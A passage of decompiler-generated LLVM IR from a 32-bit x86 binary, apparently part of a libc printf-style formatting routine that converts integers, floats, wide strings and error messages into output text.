  %v3_8051077 = inttoptr i32 %v2_8051077 to i32*
  store i32 %v0_8051077, i32* %v3_8051077, align 4
  %v0_8051078 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051078 = add i32 %v1_8051075, -16
  %v3_8051078 = inttoptr i32 %v2_8051078 to i32*
  store i32 %v0_8051078, i32* %v3_8051078, align 4
  %v0_8051079 = call i32 @_load_inttype()
  %v0_805107e = load i32, i32* @ebx, align 4
  %v1_805107e = load i32, i32* @esp, align 4
  %v2_805107e = inttoptr i32 %v1_805107e to i32*
  store i32 %v0_805107e, i32* %v2_805107e, align 4
  %v0_8051081 = load i32, i32* @esi, align 4
  %v1_8051081 = load i32, i32* @esp, align 4
  %v2_8051081 = add i32 %v1_8051081, -4
  %v3_8051081 = inttoptr i32 %v2_8051081 to i32*
  store i32 %v0_8051081, i32* %v3_8051081, align 4
  %v0_8051082 = load i32, i32* @edx, align 4
  %v2_8051082 = add i32 %v1_8051081, -8
  %v3_8051082 = inttoptr i32 %v2_8051082 to i32*
  store i32 %v0_8051082, i32* %v3_8051082, align 4
  %v2_8051083 = add i32 %v1_8051081, -12
  %v3_8051083 = inttoptr i32 %v2_8051083 to i32*
  store i32 %v0_8051079, i32* %v3_8051083, align 4
  %v1_8051084 = add i32 %v1_8051081, 347
  store i32 %v1_8051084, i32* %eax.global-to-local, align 4
  %v2_805108b = add i32 %v1_8051081, -16
  %v3_805108b = inttoptr i32 %v2_805108b to i32*
  store i32 %v1_8051084, i32* %v3_805108b, align 4
  %v0_805108c = load i32, i32* %stack_var_-364, align 4
  %v5_805108c = inttoptr i32 %v0_805108c to i8*
  %v6_805108c = call i32 @_uintmaxtostr(i8* %v5_805108c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_805108c, i32* %eax.global-to-local, align 4
  %v0_8051091 = load i32, i32* @esp, align 4
  %v1_8051091 = add i32 %v0_8051091, 32
  store i32 %v6_805108c, i32* @edi, align 4
  %v1_8051096 = add i32 %v0_8051091, 80
  %v2_8051096 = inttoptr i32 %v1_8051096 to i32*
  %v3_8051096 = load i32, i32* %v2_8051096, align 4
  %tmp96 = icmp ult i32 %v3_8051096, 6
  br i1 %tmp96, label %dec_label_pc_80510c4, label %dec_label_pc_805109d

dec_label_pc_805109d:                             ; preds = %dec_label_pc_8051075
  %v1_805109d = inttoptr i32 %v6_805108c to i8*
  %v2_805109d = load i8, i8* %v1_805109d, align 1
  %v11_805109d = icmp eq i8 %v2_805109d, 45
  %v1_80510a0 = icmp eq i1 %v11_805109d, false
  %v1_80510af = add i32 %v0_8051091, 64
  %v2_80510af = inttoptr i32 %v1_80510af to i32*
  %v3_80510af = load i32, i32* %v2_80510af, align 4
  br i1 %v1_80510a0, label %dec_label_pc_80510af, label %dec_label_pc_80510a2

dec_label_pc_80510a2:                             ; preds = %dec_label_pc_805109d
  %v4_80510a2 = or i32 %v3_80510af, 2
  store i32 %v4_80510a2, i32* %v2_80510af, align 4
  %v0_80510a7 = load i32, i32* @edi, align 4
  %v1_80510a7 = add i32 %v0_80510a7, 1
  store i32 %v1_80510a7, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_80510c4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80510c4

dec_label_pc_80510af:                             ; preds = %dec_label_pc_805109d
  store i32 %v3_80510af, i32* %eax.global-to-local, align 4
  %v2_80510b3 = and i32 %v3_80510af, 2
  %v3_80510b3 = icmp eq i32 %v2_80510b3, 0
  br i1 %v3_80510b3, label %dec_label_pc_80510bb, label %dec_label_pc_80510b7

dec_label_pc_80510b7:                             ; preds = %dec_label_pc_80510af
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80510c4

dec_label_pc_80510bb:                             ; preds = %dec_label_pc_80510af
  %v2_80510bb = urem i32 %v3_80510af, 2
  %v3_80510bb = icmp eq i32 %v2_80510bb, 0
  br i1 %v3_80510bb, label %dec_label_pc_80510c4, label %dec_label_pc_80510bf

dec_label_pc_80510bf:                             ; preds = %dec_label_pc_80510bb
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_80510c4

dec_label_pc_80510c4:                             ; preds = %dec_label_pc_80510bb, %dec_label_pc_8051075, %dec_label_pc_80510b7, %dec_label_pc_80510a2, %dec_label_pc_80510bf
  %v0_8051117 = phi i32 [ %v6_805108c, %dec_label_pc_80510bb ], [ %v6_805108c, %dec_label_pc_8051075 ], [ %v6_805108c, %dec_label_pc_80510b7 ], [ %v1_80510a7, %dec_label_pc_80510a2 ], [ %v6_805108c, %dec_label_pc_80510bf ]
  %v0_8051126 = phi i32 [ %v1_8051091, %dec_label_pc_80510bb ], [ %v1_8051091, %dec_label_pc_8051075 ], [ %v1_8051091, %dec_label_pc_80510b7 ], [ %v0_80510c4.pre, %dec_label_pc_80510a2 ], [ %v1_8051091, %dec_label_pc_80510bf ]
  %v1_80510c4 = add i32 %v0_8051126, 204
  store i32 %v1_80510c4, i32* %ecx.global-to-local, align 4
  %v1_80510cb = add i32 %v0_8051126, 20
  %v2_80510cb = inttoptr i32 %v1_80510cb to i32*
  %v3_80510cb = load i32, i32* %v2_80510cb, align 4
  store i32 %v3_80510cb, i32* %edx.global-to-local, align 4
  %v2_80510cf = sub i32 %v1_80510c4, %v0_8051117
  store i32 %v2_80510cf, i32* %ecx.global-to-local, align 4
  %v2_80510d1 = icmp slt i32 %v3_80510cb, 0
  %v1_80510d3 = add i32 %v2_80510cf, 127
  store i32 %v1_80510d3, i32* @esi, align 4
  %v1_80510d6 = icmp eq i1 %v2_80510d1, false
  br i1 %v1_80510d6, label %dec_label_pc_80510dd, label %dec_label_pc_80510d8

dec_label_pc_80510d8:                             ; preds = %dec_label_pc_80510c4
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80510dd

dec_label_pc_80510dd:                             ; preds = %dec_label_pc_80510c4, %dec_label_pc_80510d8
  %v0_8051103 = phi i32 [ %v3_80510cb, %dec_label_pc_80510c4 ], [ 1, %dec_label_pc_80510d8 ]
  %v1_80510dd = add i32 %v0_8051126, 32
  %v2_80510dd = inttoptr i32 %v1_80510dd to i8*
  %v3_80510dd = load i8, i8* %v2_80510dd, align 1
  %v4_80510dd = and i8 %v3_80510dd, 16
  %v5_80510dd = icmp eq i8 %v4_80510dd, 0
  br i1 %v5_80510dd, label %dec_label_pc_8051117, label %dec_label_pc_80510e4

dec_label_pc_80510e4:                             ; preds = %dec_label_pc_80510dd
  %v1_80510e4 = add i32 %v0_8051126, 48
  %v2_80510e4 = inttoptr i32 %v1_80510e4 to i32*
  %v3_80510e4 = load i32, i32* %v2_80510e4, align 4
  store i32 %v3_80510e4, i32* %eax.global-to-local, align 4
  %tmp97 = icmp ult i32 %v3_80510e4, 3
  br i1 %tmp97, label %dec_label_pc_80510fe.thread, label %dec_label_pc_80510f2

dec_label_pc_80510fe.thread:                      ; preds = %dec_label_pc_80510e4
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_8051117

dec_label_pc_80510f2:                             ; preds = %dec_label_pc_80510e4
  %v9_80510f2 = icmp eq i32 %v3_80510e4, 3
  %v1_80510f5 = icmp eq i1 %v9_80510f2, false
  br i1 %v1_80510f5, label %dec_label_pc_80510fe, label %dec_label_pc_80510f7

dec_label_pc_80510f7:                             ; preds = %dec_label_pc_80510f2
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_8051117

dec_label_pc_80510fe:                             ; preds = %dec_label_pc_80510f2
  %v9_80510fe = icmp eq i32 %v3_80510e4, 4
  %v1_8051101 = icmp eq i1 %v9_80510fe, false
  br i1 %v1_8051101, label %dec_label_pc_8051117, label %dec_label_pc_8051103

dec_label_pc_8051103:                             ; preds = %dec_label_pc_80510fe
  %tmp98 = icmp ugt i32 %v0_8051103, %v1_80510d3
  br i1 %tmp98, label %dec_label_pc_8051117, label %dec_label_pc_8051107

dec_label_pc_8051107:                             ; preds = %dec_label_pc_8051103
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_805110c = inttoptr i32 %v0_8051117 to i8*
  %v2_805110c = load i8, i8* %v1_805110c, align 1
  %v8_805110c = icmp eq i8 %v2_805110c, 48
  br i1 %v8_805110c, label %dec_label_pc_8051117, label %dec_label_pc_8051111

dec_label_pc_8051111:                             ; preds = %dec_label_pc_8051107
  %v1_8051111 = add i32 %v2_80510cf, 128
  store i32 %v1_8051111, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051117

dec_label_pc_8051117:                             ; preds = %dec_label_pc_80510fe.thread, %dec_label_pc_8051103, %dec_label_pc_8051107, %dec_label_pc_80510fe, %dec_label_pc_80510dd, %dec_label_pc_80510f7, %dec_label_pc_8051111
  %v0_805114f = phi i32 [ %v0_8051103, %dec_label_pc_8051103 ], [ 1, %dec_label_pc_8051107 ], [ %v0_8051103, %dec_label_pc_80510fe ], [ %v0_8051103, %dec_label_pc_80510dd ], [ %v0_8051103, %dec_label_pc_80510f7 ], [ %v1_8051111, %dec_label_pc_8051111 ], [ %v0_8051103, %dec_label_pc_80510fe.thread ]
  %v1_8051117 = inttoptr i32 %v0_8051117 to i8*
  %v2_8051117 = load i8, i8* %v1_8051117, align 1
  %v8_8051117 = icmp eq i8 %v2_8051117, 48
  %v1_805111a = icmp eq i1 %v8_8051117, false
  br i1 %v1_805111a, label %dec_label_pc_8051147, label %dec_label_pc_805111c

dec_label_pc_805111c:                             ; preds = %dec_label_pc_8051117
  %v0_805111c = load i32, i32* @ebp, align 4
  %v7_805111f = icmp sgt i32 %v0_805111c, 5
  br i1 %v7_805111f, label %dec_label_pc_8051121, label %dec_label_pc_8051126

dec_label_pc_8051121:                             ; preds = %dec_label_pc_805111c
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_8051126

dec_label_pc_8051126:                             ; preds = %dec_label_pc_805111c, %dec_label_pc_8051121
  %v1_8051126 = add i32 %v0_8051126, 48
  %v2_8051126 = inttoptr i32 %v1_8051126 to i32*
  %v3_8051126 = load i32, i32* %v2_8051126, align 4
  %v12_8051126 = icmp eq i32 %v3_8051126, 1
  %v1_805112b = icmp eq i1 %v12_8051126, false
  br i1 %v1_805112b, label %dec_label_pc_805113c, label %dec_label_pc_805112d

dec_label_pc_805112d:                             ; preds = %dec_label_pc_8051126
  store i32 ptrtoint ([6 x i8]* @global_var_80592f8.471 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_80512b8

dec_label_pc_805113c:                             ; preds = %dec_label_pc_8051126
  %v1_805113c = icmp eq i32 %v0_805114f, 0
  %v1_805113e = icmp eq i1 %v1_805113c, false
  br i1 %v1_805113e, label %dec_label_pc_8051147, label %dec_label_pc_8051140

dec_label_pc_8051140:                             ; preds = %dec_label_pc_805113c
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80512b8

dec_label_pc_8051147:                             ; preds = %dec_label_pc_805113c, %dec_label_pc_8051117
  %v2_8051147 = sub i32 %v0_805114f, %v1_80510d3
  %v7_8051147 = icmp ult i32 %v0_805114f, %v1_80510d3
  %v12_8051147 = icmp eq i32 %v2_8051147, 0
  %v2_8051149 = or i1 %v7_8051147, %v12_8051147
  br i1 %v2_8051149, label %dec_label_pc_80512b8, label %dec_label_pc_805114f

dec_label_pc_805114f:                             ; preds = %dec_label_pc_8051147
  store i32 %v2_8051147, i32* @ebx, align 4
  br label %dec_label_pc_80512d2

dec_label_pc_8051158:                             ; preds = %dec_label_pc_8050fee
  %tmp99 = icmp ult i32 %v3_8050fc0, 16
  br i1 %tmp99, label %dec_label_pc_805115d, label %dec_label_pc_80511a2

dec_label_pc_805115d:                             ; preds = %dec_label_pc_8051158
  %v1_805115d = add i32 %v0_8050fc0.lcssa, 33
  %v2_805115d = inttoptr i32 %v1_805115d to i8*
  %v3_805115d = load i8, i8* %v2_805115d, align 1
  %v4_805115d = and i8 %v3_805115d, 8
  %v5_805115d = icmp eq i8 %v4_805115d, 0
  %v1_8051162 = add i32 %v0_8050fc0.lcssa, 344
  %v2_8051162 = inttoptr i32 %v1_8051162 to i32*
  %v3_8051162 = load i32, i32* %v2_8051162, align 4
  store i32 %v3_8051162, i32* %edx.global-to-local, align 4
  br i1 %v5_805115d, label %dec_label_pc_805116f, label %dec_label_pc_805116b

dec_label_pc_805116b:                             ; preds = %dec_label_pc_805115d
  %v1_805116b = inttoptr i32 %v3_8051162 to x86_fp80*
  %v2_805116b = load x86_fp80, x86_fp80* %v1_805116b, align 4
  br label %dec_label_pc_8051171

dec_label_pc_805116f:                             ; preds = %dec_label_pc_805115d
  %v1_805116f = inttoptr i32 %v3_8051162 to double*
  %v2_805116f = load double, double* %v1_805116f, align 4
  %v3_805116f = fpext double %v2_805116f to x86_fp80
  br label %dec_label_pc_8051171

dec_label_pc_8051171:                             ; preds = %dec_label_pc_805116b, %dec_label_pc_805116f
  %storemerge5 = phi x86_fp80 [ %v2_805116b, %dec_label_pc_805116b ], [ %v3_805116f, %dec_label_pc_805116f ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_8051171 = load i32, i32* @esi, align 4
  %v2_8051171 = add i32 %v0_8050fc0.lcssa, -4
  %v3_8051171 = inttoptr i32 %v2_8051171 to i32*
  store i32 %v0_8051171, i32* %v3_8051171, align 4
  %v0_8051172 = load i32, i32* @esi, align 4
  %v2_8051172 = add i32 %v0_8050fc0.lcssa, -8
  %v3_8051172 = inttoptr i32 %v2_8051172 to i32*
  store i32 %v0_8051172, i32* %v3_8051172, align 4
  %v1_8051173 = add i32 %v0_8050fc0.lcssa, -12
  %v2_8051173 = inttoptr i32 %v1_8051173 to i32*
  store i32 134549046, i32* %v2_8051173, align 4
  %v1_8051178 = add i32 %v0_8050fc0.lcssa, 20
  store i32 %v1_8051178, i32* %eax.global-to-local, align 4
  %v2_805117c = add i32 %v0_8050fc0.lcssa, -16
  %v3_805117c = inttoptr i32 %v2_805117c to i32*
  store i32 %v1_8051178, i32* %v3_805117c, align 4
  %v1_805117d = add i32 %v0_8050fc0.lcssa, -28
  %v1_8051180 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8051180 = inttoptr i32 %v1_805117d to x86_fp80*
  store x86_fp80 %v1_8051180, x86_fp80* %v3_8051180, align 4
  %v1_8051183 = add i32 %v0_8050fc0.lcssa, 368
  %v2_8051183 = inttoptr i32 %v1_8051183 to i32*
  %v3_8051183 = load i32, i32* %v2_8051183, align 4
  %v5_8051183 = add i32 %v0_8050fc0.lcssa, -32
  %v6_8051183 = inttoptr i32 %v5_8051183 to i32*
  store i32 %v3_8051183, i32* %v6_8051183, align 4
  %v0_805118a = call i32 @_fpmaxtostr()
  store i32 %v0_805118a, i32* %eax.global-to-local, align 4
  %v0_805118f = load i32, i32* @esp, align 4
  %v1_805118f = add i32 %v0_805118f, 32
  %v2_8051192 = icmp slt i32 %v0_805118a, 0
  br i1 %v2_8051192, label %dec_label_pc_8051433, label %dec_label_pc_805119a

dec_label_pc_805119a:                             ; preds = %dec_label_pc_8051171
  %v1_805119a = inttoptr i32 %v1_805118f to i32*
  %v2_805119a = load i32, i32* %v1_805119a, align 4
  %v4_805119a = add i32 %v2_805119a, %v0_805118a
  store i32 %v4_805119a, i32* %v1_805119a, align 4
  %v0_8051420.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051420

dec_label_pc_80511a2:                             ; preds = %dec_label_pc_8051158
  %tmp100 = or i32 %v3_8050fc0, 1
  %tmp101 = icmp eq i32 %tmp100, 17
  br i1 %tmp101, label %dec_label_pc_80511ab, label %dec_label_pc_805123e

dec_label_pc_80511ab:                             ; preds = %dec_label_pc_80511a2
  %v9_80511a2 = icmp eq i32 %v3_8050fc0, 17
  %v1_80511ab = add i32 %v0_8050fc0.lcssa, 332
  %v2_80511ab = inttoptr i32 %v1_80511ab to i32*
  store i32 0, i32* %v2_80511ab, align 4
  %v0_80511b6 = load i32, i32* @esp, align 4
  %v1_80511b6 = add i32 %v0_80511b6, 344
  %v2_80511b6 = inttoptr i32 %v1_80511b6 to i32*
  %v3_80511b6 = load i32, i32* %v2_80511b6, align 4
  store i32 %v3_80511b6, i32* %edx.global-to-local, align 4
  %v1_80511bd = icmp eq i1 %v9_80511a2, false
  br i1 %v1_80511bd, label %dec_label_pc_8051209, label %dec_label_pc_80511bf

dec_label_pc_80511bf:                             ; preds = %dec_label_pc_80511ab
  %v1_80511bf = inttoptr i32 %v3_80511b6 to i32*
  %v2_80511bf = load i32, i32* %v1_80511bf, align 4
  store i32 %v2_80511bf, i32* %eax.global-to-local, align 4
  %v2_80511c1 = add i32 %v0_80511b6, 340
  %v3_80511c1 = inttoptr i32 %v2_80511c1 to i32*
  store i32 %v2_80511bf, i32* %v3_80511c1, align 4
  %v0_80511c8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80511c8 = icmp eq i32 %v0_80511c8, 0
  br i1 %v1_80511c8, label %dec_label_pc_80512bc, label %dec_label_pc_80511d0

dec_label_pc_80511d0:                             ; preds = %dec_label_pc_80511bf
  %v0_80511d0 = load i32, i32* @esp, align 4
  %v1_80511d0 = add i32 %v0_80511d0, 20
  %v2_80511d0 = inttoptr i32 %v1_80511d0 to i32*
  %v3_80511d0 = load i32, i32* %v2_80511d0, align 4
  store i32 %v3_80511d0, i32* %eax.global-to-local, align 4
  %v2_80511d7 = icmp slt i32 %v3_80511d0, 0
  br i1 %v2_80511d7, label %dec_label_pc_80511dd, label %dec_label_pc_80511db

dec_label_pc_80511db:                             ; preds = %dec_label_pc_80511d0
  br label %dec_label_pc_80511dd

dec_label_pc_80511dd:                             ; preds = %dec_label_pc_80511d0, %dec_label_pc_80511db
  %storemerge105 = phi i32 [ %v3_80511d0, %dec_label_pc_80511db ], [ -1, %dec_label_pc_80511d0 ]
  store i32 %storemerge105, i32* %ecx.global-to-local, align 4
  %v1_80511dd = add i32 %v0_80511d0, 340
  store i32 %v1_80511dd, i32* %edx.global-to-local, align 4
  %v1_80511e4 = add i32 %v0_80511d0, 332
  store i32 %v1_80511e4, i32* %eax.global-to-local, align 4
  %v2_80511eb = add i32 %v0_80511d0, -4
  %v3_80511eb = inttoptr i32 %v2_80511eb to i32*
  store i32 %v1_80511e4, i32* %v3_80511eb, align 4
  %v0_80511ec = load i32, i32* %ecx.global-to-local, align 4
  %v2_80511ec = add i32 %v0_80511d0, -8
  %v3_80511ec = inttoptr i32 %v2_80511ec to i32*
  store i32 %v0_80511ec, i32* %v3_80511ec, align 4
  %v0_80511ed = load i32, i32* %edx.global-to-local, align 4
  %v2_80511ed = add i32 %v0_80511d0, -12
  %v3_80511ed = inttoptr i32 %v2_80511ed to i32*
  store i32 %v0_80511ed, i32* %v3_80511ed, align 4
  %v0_80511ee = load i32, i32* %edx.global-to-local, align 4
  %v2_80511ee = add i32 %v0_80511d0, -16
  %v3_80511ee = inttoptr i32 %v2_80511ee to i32*
  store i32 %v0_80511ee, i32* %v3_80511ee, align 4
  %v0_80511ef = call i32 @__GI_wcsrtombs()
  store i32 %v0_80511ef, i32* %eax.global-to-local, align 4
  %v0_80511f4 = load i32, i32* @esp, align 4
  %v1_80511f4 = add i32 %v0_80511f4, 16
  store i32 %v0_80511ef, i32* @esi, align 4
  %v10_80511f9 = icmp eq i32 %v0_80511ef, -1
  br i1 %v10_80511f9, label %dec_label_pc_8051433, label %dec_label_pc_8051202

dec_label_pc_8051202:                             ; preds = %dec_label_pc_80511dd
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_80512c6

dec_label_pc_8051209:                             ; preds = %dec_label_pc_80511ab
  %v0_8051209 = load i32, i32* @ebx, align 4
  %v2_8051209 = add i32 %v0_80511b6, -4
  %v3_8051209 = inttoptr i32 %v2_8051209 to i32*
  store i32 %v0_8051209, i32* %v3_8051209, align 4
  %v1_805120a = add i32 %v0_80511b6, 332
  store i32 %v1_805120a, i32* %eax.global-to-local, align 4
  %v2_8051211 = add i32 %v0_80511b6, -8
  %v3_8051211 = inttoptr i32 %v2_8051211 to i32*
  store i32 %v1_805120a, i32* %v3_8051211, align 4
  %v0_8051212 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051212 = inttoptr i32 %v0_8051212 to i32*
  %v2_8051212 = load i32, i32* %v1_8051212, align 4
  %v4_8051212 = add i32 %v0_80511b6, -12
  %v5_8051212 = inttoptr i32 %v4_8051212 to i32*
  store i32 %v2_8051212, i32* %v5_8051212, align 4
  %v1_8051214 = add i32 %v0_80511b6, 204
  store i32 %v1_8051214, i32* @ebx, align 4
  %v2_805121b = add i32 %v0_80511b6, -16
  %v3_805121b = inttoptr i32 %v2_805121b to i32*
  store i32 %v1_8051214, i32* %v3_805121b, align 4
  %v0_805121c = call i32 @__GI_wcrtomb()
  store i32 %v0_805121c, i32* %eax.global-to-local, align 4
  %v0_8051221 = load i32, i32* @esp, align 4
  %v1_8051221 = add i32 %v0_8051221, 16
  store i32 %v0_805121c, i32* @esi, align 4
  %v10_8051226 = icmp eq i32 %v0_805121c, -1
  br i1 %v10_8051226, label %dec_label_pc_8051433, label %dec_label_pc_805122f

dec_label_pc_805122f:                             ; preds = %dec_label_pc_8051209
  %v0_805122f = load i32, i32* @ebx, align 4
  store i32 %v0_805122f, i32* @edi, align 4
  %v2_8051231 = add i32 %v0_805121c, 220
  %v3_8051231 = add i32 %v2_8051231, %v0_8051221
  %v4_8051231 = inttoptr i32 %v3_8051231 to i8*
  store i8 0, i8* %v4_8051231, align 1
  br label %dec_label_pc_80512c6

dec_label_pc_805123e:                             ; preds = %dec_label_pc_80511a2
  %tmp102 = icmp ult i32 %v3_8050fc0, 20
  br i1 %tmp102, label %dec_label_pc_8051243, label %dec_label_pc_805128e

dec_label_pc_8051243:                             ; preds = %dec_label_pc_805123e
  %v9_805123e = icmp eq i32 %v3_8050fc0, 19
  %v1_8051243 = add i32 %v0_8050fc0.lcssa, 344
  %v2_8051243 = inttoptr i32 %v1_8051243 to i32*
  %v3_8051243 = load i32, i32* %v2_8051243, align 4
  store i32 %v3_8051243, i32* %edx.global-to-local, align 4
  %v1_805124a = icmp eq i1 %v9_805123e, false
  %v1_805126f = inttoptr i32 %v3_8051243 to i32*
  %v2_805126f = load i32, i32* %v1_805126f, align 4
  br i1 %v1_805124a, label %dec_label_pc_805126f, label %dec_label_pc_805124c

dec_label_pc_805124c:                             ; preds = %dec_label_pc_8051243
  store i32 %v2_805126f, i32* @edi, align 4
  %v1_805124e = icmp eq i32 %v2_805126f, 0
  br i1 %v1_805124e, label %dec_label_pc_80512bc, label %dec_label_pc_8051252

dec_label_pc_8051252:                             ; preds = %dec_label_pc_805124c, %dec_label_pc_8051297
  %v1_805125f = phi i32 [ %v0_8050fc0.lcssa, %dec_label_pc_805124c ], [ %v1_80512b1, %dec_label_pc_8051297 ]
  %v1_8051252 = add i32 %v1_805125f, 20
  %v2_8051252 = inttoptr i32 %v1_8051252 to i32*
  %v3_8051252 = load i32, i32* %v2_8051252, align 4
  store i32 %v3_8051252, i32* %eax.global-to-local, align 4
  %v2_8051259 = icmp slt i32 %v3_8051252, 0
  br i1 %v2_8051259, label %dec_label_pc_805125f, label %dec_label_pc_805125d

dec_label_pc_805125d:                             ; preds = %dec_label_pc_8051252
  br label %dec_label_pc_805125f

dec_label_pc_805125f:                             ; preds = %dec_label_pc_8051252, %dec_label_pc_805125d
  %storemerge = phi i32 [ %v3_8051252, %dec_label_pc_805125d ], [ -1, %dec_label_pc_8051252 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_805125f = add i32 %v1_805125f, -4
  %v3_805125f = inttoptr i32 %v2_805125f to i32*
  store i32 %v3_8050fc0, i32* %v3_805125f, align 4
  %v2_8051260 = add i32 %v1_805125f, -8
  %v3_8051260 = inttoptr i32 %v2_8051260 to i32*
  store i32 %v3_8050fc0, i32* %v3_8051260, align 4
  %v0_8051261 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051261 = add i32 %v1_805125f, -12
  %v3_8051261 = inttoptr i32 %v2_8051261 to i32*
  store i32 %v0_8051261, i32* %v3_8051261, align 4
  %v0_8051262 = load i32, i32* @edi, align 4
  %v2_8051262 = add i32 %v1_805125f, -16
  %v3_8051262 = inttoptr i32 %v2_8051262 to i32*
  store i32 %v0_8051262, i32* %v3_8051262, align 4
  %v0_8051263 = call i32 @strnlen()
  store i32 %v0_8051263, i32* %eax.global-to-local, align 4
  store i32 %v0_8051263, i32* @esi, align 4
  br label %dec_label_pc_80512c6

dec_label_pc_805126f:                             ; preds = %dec_label_pc_8051243
  store i32 %v2_805126f, i32* %eax.global-to-local, align 4
  %v1_8051271 = add i32 %v0_8050fc0.lcssa, 204
  store i32 %v1_8051271, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_805127d = trunc i32 %v2_805126f to i8
  %v4_805127d = inttoptr i32 %v1_8051271 to i8*
  store i8 %v1_805127d, i8* %v4_805127d, align 1
  %v0_8051284 = load i32, i32* @esp, align 4
  %v1_8051284 = add i32 %v0_8051284, 205
  %v2_8051284 = inttoptr i32 %v1_8051284 to i8*
  store i8 0, i8* %v2_8051284, align 1
  br label %dec_label_pc_80512c6

dec_label_pc_805128e:                             ; preds = %dec_label_pc_805123e
  %v9_805128e = icmp eq i32 %v3_8050fc0, 20
  %v1_8051291 = icmp eq i1 %v9_805128e, false
  br i1 %v1_8051291, label %dec_label_pc_8051433, label %dec_label_pc_8051297

dec_label_pc_8051297:                             ; preds = %dec_label_pc_805128e
  %v0_8051297 = load i32, i32* %stack_var_-364, align 4
  %v1_8051297 = call i32 @__errno_location(i32 %v0_8051297)
  store i32 %v1_8051297, i32* %eax.global-to-local, align 4
  %v0_805129c = load i32, i32* %edx.global-to-local, align 4
  %v1_805129c = load i32, i32* @esp, align 4
  %v2_805129c = add i32 %v1_805129c, -4
  %v3_805129c = inttoptr i32 %v2_805129c to i32*
  store i32 %v0_805129c, i32* %v3_805129c, align 4
  %v1_805129d = add i32 %v1_805129c, -8
  %v2_805129d = inttoptr i32 %v1_805129d to i32*
  store i32 128, i32* %v2_805129d, align 4
  %v1_80512a2 = add i32 %v1_805129c, 204
  store i32 %v1_80512a2, i32* %edx.global-to-local, align 4
  %v2_80512a9 = add i32 %v1_805129c, -12
  %v3_80512a9 = inttoptr i32 %v2_80512a9 to i32*
  store i32 %v1_80512a2, i32* %v3_80512a9, align 4
  %v1_80512aa = inttoptr i32 %v1_8051297 to i32*
  %v2_80512aa = load i32, i32* %v1_80512aa, align 4
  %v4_80512aa = add i32 %v1_805129c, -16
  %v5_80512aa = inttoptr i32 %v4_80512aa to i32*
  store i32 %v2_80512aa, i32* %v5_80512aa, align 4
  %v0_80512ac = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_80512ac, i32* %eax.global-to-local, align 4
  %v0_80512b1 = load i32, i32* @esp, align 4
  %v1_80512b1 = add i32 %v0_80512b1, 16
  store i32 %v0_80512ac, i32* @edi, align 4
  br label %dec_label_pc_8051252

dec_label_pc_80512b8:                             ; preds = %dec_label_pc_8051147, %dec_label_pc_8051140, %dec_label_pc_805112d
  %v0_80512d237 = phi i32 [ %v1_80510d3, %dec_label_pc_8051147 ], [ 0, %dec_label_pc_8051140 ], [ 5, %dec_label_pc_805112d ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80512d2

dec_label_pc_80512bc:                             ; preds = %dec_label_pc_805124c, %dec_label_pc_80511bf
  store i32 ptrtoint ([7 x i8]* @global_var_80592fe.472 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_80512c6

dec_label_pc_80512c6:                             ; preds = %dec_label_pc_805126f, %dec_label_pc_805125f, %dec_label_pc_805122f, %dec_label_pc_8051202, %dec_label_pc_80512bc
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_80512cd = load i32, i32* @esp, align 4
  %v1_80512cd = add i32 %v0_80512cd, 7
  %v2_80512cd = inttoptr i32 %v1_80512cd to i8*
  store i8 32, i8* %v2_80512cd, align 1
  %v0_80512d2.pre = load i32, i32* @esi, align 4
  %v1_80512d2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80512d2

dec_label_pc_80512d2:                             ; preds = %dec_label_pc_80512b8, %dec_label_pc_805114f, %dec_label_pc_80512c6
  %v1_80512d2 = phi i32 [ 0, %dec_label_pc_80512b8 ], [ %v2_8051147, %dec_label_pc_805114f ], [ %v1_80512d2.pre, %dec_label_pc_80512c6 ]
  %v0_80512d2 = phi i32 [ %v0_80512d237, %dec_label_pc_80512b8 ], [ %v1_80510d3, %dec_label_pc_805114f ], [ %v0_80512d2.pre, %dec_label_pc_80512c6 ]
  %v2_80512d2 = add i32 %v0_80512d2, %v1_80512d2
  store i32 %v2_80512d2, i32* @edx, align 4
  %v0_80512d5 = load i32, i32* @ebp, align 4
  %v9_80512d5 = icmp eq i32 %v0_80512d5, 11
  br i1 %v9_80512d5, label %dec_label_pc_80512e6, label %dec_label_pc_80512da

dec_label_pc_80512da:                             ; preds = %dec_label_pc_80512d2
  %v1_80512dc = add i32 %v0_80512d5, -5
  %v6_80512dc = sub i32 4, %v0_80512d5
  %v7_80512dc = and i32 %v6_80512dc, %v0_80512d5
  %v8_80512dc = icmp slt i32 %v7_80512dc, 0
  %v9_80512dc = icmp eq i32 %v1_80512dc, 0
  %v10_80512dc = icmp slt i32 %v1_80512dc, 0
  %v3_80512df = icmp eq i1 %v10_80512dc, %v8_80512dc
  %v4_80512df = icmp eq i1 %v9_80512dc, false
  %v5_80512df = and i1 %v4_80512df, %v3_80512df
  %v6_80512df = zext i1 %v5_80512df to i32
